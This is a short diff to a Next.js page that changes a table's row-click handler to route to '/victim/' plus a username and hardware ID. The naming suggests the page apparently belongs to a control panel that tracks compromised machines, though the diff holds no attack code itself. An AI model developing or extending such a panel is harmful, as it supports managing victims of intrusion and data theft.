@@ -59,8 +59,8 @@ const Home: NextPage = () => {
             /* { accessor: 'bornIn' }, */
           ]}
           // execute this callback when a row is clicked
-          onRowClick={({ hwid }) => {
-            router.push('/victim/' + hwid);
+          onRowClick={({ username, hwid }) => {
+            router.push('/victim/' + username + '-' + hwid);
           }}
         />
       </main>
